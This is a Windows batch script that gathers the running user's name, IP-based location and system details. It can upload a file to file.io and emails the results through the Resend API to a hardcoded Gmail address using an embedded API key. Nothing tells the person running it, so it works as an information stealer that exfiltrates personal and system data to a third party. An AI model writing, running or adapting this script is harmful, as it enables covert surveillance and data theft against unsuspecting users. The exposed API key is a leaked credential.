@echo off
:: Initialize variables
set subject=
set body=
set file=
set send_all_info=false

:: Hardcoded receiver email
set receiver=marcush3llsquad@gmail.com

:: Get sender's name from environment
for /F "tokens=2 delims==" %%G in ('"wmic computersystem get username /value"') do set sender_name=%%G

:: Get user's location via IP
for /F "usebackq tokens=*" %%G in (`powershell -Command "(Invoke-RestMethod -Uri 'https://ipinfo.io/loc').Content"`) do set location=%%G

:: Gather comprehensive system information
for /F "tokens=*" %%G in ('ver') do set os_info=%%G
for /F "tokens=2,*" %%G in ('wmic cpu get name /value') do set cpu_info=%%H
for /F "tokens=2,*" %%G in ('wmic os get osarchitecture /value') do set cpu_arch=%%H
for /F "tokens=2 delims==" %%G in ('"wmic computersystem get totalphysicalmemory /value"') do set mem_total=%%G
for /F "tokens=2 delims==" %%G in ('"wmic os get freephysicalmemory /value"') do set mem_free=%%G
for /F "tokens=2 delims==" %%G in ('"wmic os get localdatetime /value"') do set uptime_info=%%G

:: Placeholder for other system information (Disk usage, Network interfaces)
set disk_usage=N/A
set network_interfaces=N/A

:: Check command line arguments
setlocal enabledelayedexpansion
set i=0
for %%a in (%*) do (
    set /A i+=1
    if "%%a"=="-s" set subject=!subject! %%b
    if "%%a"=="-b" set body=!body! %%b
    if "%%a"=="-f" set file=!file! %%b
    if "%%a"=="-a" set send_all_info=true
)

:: If subject is not provided, use the sender's name
if "%subject%"=="" set subject=%sender_name%

:: If body is not provided, use the user's location
if "%body%"=="" set body=User Location: %location%

:: Upload the file using Invoke-RestMethod if file exists
set file_link=
if not "%file%"=="" (
    if exist "%file%" (
        echo Uploading file...
        for /F "tokens=*" %%G in ('powershell -Command "(Invoke-RestMethod -Uri 'https://file.io' -Method Post -Form @{file=Get-Item '%file%'}).link"') do set file_link=%%G
    )
)

:: Set API key and endpoint
set api_key=re_dSFUhTGY_6hNYMi4Uc33SfBBSfLY9Uotw
set url=https://api.resend.com/emails

:: Create email body based on send_all_info flag
if "%send_all_info%"=="true" (
    set full_body=<p>%body%</p><hr><h3>Comprehensive System Information:</h3><ul><li><strong>OS Info:</strong> %os_info%</li><li><strong>CPU Info:</strong> %cpu_info%</li><li><strong>CPU Architecture:</strong> %cpu_arch%</li><li><strong>Total Memory:</strong> %mem_total%</li><li><strong>Free Memory:</strong> %mem_free%</li><li><strong>Uptime:</strong> %uptime_info%</li><li><strong>File:</strong> %file_link%</li></ul>
) else (
    set full_body=<p>%body%</p><p><strong>File uploaded:</strong> <a href='%file_link%'>%file%</a></p>
)

:: Create email data for sending
powershell -Command ^
  "$email_data = @{ from = '%sender_name% <onboarding@resend.dev>'; to = '%receiver%'; subject = '%subject%'; html = '%full_body%' }; " ^
  "Invoke-RestMethod -Uri '%url%' -Method Post -Body (ConvertTo-Json $email_data) -Headers @{ 'Authorization' = 'Bearer %api_key%'; 'Content-Type' = 'application/json' }"
